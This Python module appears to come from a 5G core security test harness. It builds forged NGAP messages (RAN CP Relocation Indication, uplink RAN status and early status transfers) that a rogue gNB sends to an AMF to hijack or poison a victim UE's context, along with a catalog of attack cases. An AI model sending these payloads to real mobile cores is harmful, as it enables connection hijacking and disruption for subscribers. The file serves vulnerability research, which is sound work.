"""Cross-gNB NGAP test cases for batch22 chunk p19-p22.

Covers four UE-associated / mobility procedures whose AMF handlers were flagged
(LLM screen + spec review) as candidates for the missing sender-binding class of
bug: the AMF resolves a victim UE context from a forgeable identifier without
proving the message came from that UE's current serving NG-RAN node / SCTP
association, so a rogue gNB can act on / relay state for a UE served elsewhere.

  p19 RANCPRelocationIndication      (procCode 57) -- NEW builder here
  p20 ConnectionEstablishmentIndication (procCode 65) -- NEW builder here
  p21 UplinkRANStatusTransfer        (procCode 49) -- reuse B.uplink_ran_status_transfer
  p22 UplinkRANEarlyStatusTransfer   (procCode 62) -- NEW builder here

Per the task, this file owns the NEW builders (builders.py is not edited). They
follow the same value-tree convention as ngaptester.builders and reuse its
helpers (encode_plmn). Field names verified against pycrate NGAP (38413-g70).
"""
from __future__ import annotations

from . import builders as B, ngap  # noqa: F401  (ngap used by the validate line)


CFG = {"mcc": "001", "mnc": "01", "tac": 1, "sst": 1, "sd": "010203",
       "gnb_id": 4660, "gnb_id_len": 32, "nci": 17,
       # extra identifiers these procedures need (attacker-asserted / victim-forged):
       "amf_set_id": 1, "amf_pointer": 0, "tmsi": "01020304",
       "eutra_cell_id": 0x0ABCDE}


# ---------------------------------------------------------------- shared bits
def _five_g_s_tmsi(cfg: dict, tmsi=None):
    """FiveG-S-TMSI = {AMFSetID(10b), AMFPointer(6b), 5G-TMSI(4 octets)}.

    This is the temporary UE identity p19 uses to resolve the victim context;
    the attacker forges/observes it (it is not a cryptographic credential)."""
    tm = cfg.get("tmsi", "01020304") if tmsi is None else tmsi
    return {
        "aMFSetID": (int(cfg.get("amf_set_id", 1)), 10),
        "aMFPointer": (int(cfg.get("amf_pointer", 0)), 6),
        "fiveG-TMSI": bytes.fromhex(tm) if isinstance(tm, str) else bytes(tm),
    }


def _eutra_cgi(cfg: dict, cell_id=None):
    """EUTRA-CGI (ng-eNB cell) the attacker claims to serve. EUTRACellIdentity is
    a 28-bit BIT STRING."""
    cid = int(cfg.get("eutra_cell_id", 0x0ABCDE)) if cell_id is None else int(cell_id)
    return {"pLMNIdentity": B.encode_plmn(cfg["mcc"], cfg["mnc"]),
            "eUTRACellIdentity": (cid, 28)}


def _tai(cfg: dict, tac=None):
    tac_b = int(cfg["tac"] if tac is None else tac).to_bytes(3, "big")
    return {"pLMNIdentity": B.encode_plmn(cfg["mcc"], cfg["mnc"]), "tAC": tac_b}


def _ul_cp_security_information(mac: int = 0, count: int = 0):
    """UL-CP-SecurityInformation = {UL-NAS-MAC(16b), UL-NAS-Count(5b)}. The AMF is
    supposed to verify this against the UE's NAS security context; attacker-chosen
    here to test whether it is actually checked before the relocation side effect."""
    return {"ul-NAS-MAC": (mac, 16), "ul-NAS-Count": (count, 5)}


# ---------------------------------------------------------------- p19 builder
def ran_cp_relocation_indication(cfg: dict, ran_ue_id: int, *, tmsi=None,
                                 cell_id=None, tac=None, mac: int = 0,
                                 count: int = 0):
    """RAN CP RELOCATION INDICATION (Class 2, procedureCode 57, CRIT reject).

    NB-IoT Control Plane CIoT 5GS Optimisation re-establishment relocation. NOTE:
    this procedure carries NO AMF-UE-NGAP-ID -- the victim is resolved by the
    forged FiveG-S-TMSI. The attacker supplies a new RAN-UE-NGAP-ID (its own logical
    connection) plus attacker-claimed EUTRA-CGI/TAI; if the AMF trusts this without
    proving a real RRC re-establishment / source binding it relocates the victim's
    UE-associated NG connection to the rogue node (confused-deputy relocation)."""
    ies = [
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 26, "criticality": "reject",
         "value": ("FiveG-S-TMSI", _five_g_s_tmsi(cfg, tmsi))},
        {"id": 25, "criticality": "ignore",
         "value": ("EUTRA-CGI", _eutra_cgi(cfg, cell_id))},
        {"id": 213, "criticality": "ignore", "value": ("TAI", _tai(cfg, tac))},
        {"id": 211, "criticality": "reject",
         "value": ("UL-CP-SecurityInformation",
                   _ul_cp_security_information(mac, count))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 57, "criticality": "reject",
        "value": ("RANCPRelocationIndication", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- p20 builder
def connection_establishment_indication(amf_ue_id: int, ran_ue_id: int, *,
                                        ue_radio_capability: bytes | None = None):
    """CONNECTION ESTABLISHMENT INDICATION (Class 2, procedureCode 65, CRIT reject).

    Spec direction is AMF -> NG-RAN (downlink, carries UE Radio Capability). A rogue
    gNB sending it *up* to the AMF is a non-standard / reverse-direction probe: it
    tests whether the AMF's dispatcher rejects a downlink-only procedure or instead
    resolves the victim by AMF-UE-NGAP-ID and rebinds/leaks context. The high-value
    real path is INDUCED (a prior forged uplink UE-assoc msg makes the AMF emit this
    toward the attacker), which our encoder cannot drive on its own -- see catalog."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
    ]
    if ue_radio_capability is not None:
        ies.append({"id": 117, "criticality": "ignore",
                    "value": ("UERadioCapability", ue_radio_capability)})
    return ("initiatingMessage", {
        "procedureCode": 65, "criticality": "reject",
        "value": ("ConnectionEstablishmentIndication", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- p22 builder
def _early_status_container(drb_id: int = 1, pdcp_sn: int = 0, hfn: int = 0):
    """EarlyStatusTransfer-TransparentContainer, first-dl-count branch: >=1 DRB
    item with a DL COUNT (PDCP-SN18 / HFN). These are the attacker-forged early
    PDCP status values the AMF would relay to the target gNB."""
    return {
        "procedureStage": ("first-dl-count", {
            "dRBsSubjectToEarlyStatusTransfer": [
                {"dRB-ID": int(drb_id),
                 "firstDLCOUNT": ("dRBStatusDL18",
                                  {"dL-COUNTValue": {"pDCP-SN18": pdcp_sn,
                                                     "hFN-PDCP-SN18": hfn}})},
            ],
        }),
    }


def uplink_ran_early_status_transfer(amf_ue_id: int, ran_ue_id: int, *,
                                     drb_id: int = 1, pdcp_sn: int = 0,
                                     hfn: int = 0):
    """UPLINK RAN EARLY STATUS TRANSFER (Class 2, procedureCode 62, CRIT reject).

    DAPS / early-data-forwarding sibling of p21. Victim located by AMF-UE-NGAP-ID;
    on a stack that skips source-gNB/handover-state binding the AMF relays the forged
    EarlyStatusTransfer container to the legitimate target gNB (DOWNLINK RAN EARLY
    STATUS TRANSFER), poisoning early PDCP/forwarding state for a remote UE."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 268, "criticality": "reject",
         "value": ("EarlyStatusTransfer-TransparentContainer",
                   _early_status_container(drb_id, pdcp_sn, hfn))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 62, "criticality": "reject",
        "value": ("UplinkRANEarlyStatusTransfer", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- case catalog
# Victim/attacker identifier conventions:
#   victim AMF-UE-NGAP-ID  = 0x0001 (forged/enumerated)
#   attacker RAN-UE-NGAP-ID = 0x4242 (rogue node's own id, unbound to victim)
CASES = [
    {"id": "p19-a", "msg": "RANCPRelocationIndication",
     "desc": "False CP relocation of a remote NB-IoT UE (victim keyed by 5G-S-TMSI) -> "
             "AMF moves its UE-assoc NG connection to the rogue node (conditional).",
     "build": lambda cfg: ran_cp_relocation_indication(cfg, 0x4242)},
    # p20 ConnectionEstablishmentIndication dropped: AMF->gNB downlink-only procedure
    # (reverse-direction probe, not a standalone attack).
    {"id": "p21-a", "msg": "UplinkRANStatusTransfer",
     "desc": "Relay forged PDCP status to the target gNB during a victim's active N2 "
             "handover (gated by an in-progress handover).",
     "build": lambda cfg: B.uplink_ran_status_transfer(0x0001, 0x4242, drb_id=1)},
    {"id": "p22-a", "msg": "UplinkRANEarlyStatusTransfer",
     "desc": "Inject false early PDCP status during DAPS/early-forwarding handover "
             "(gated by an in-progress handover).",
     "build": lambda cfg: uplink_ran_early_status_transfer(0x0001, 0x4242, drb_id=1)},
]
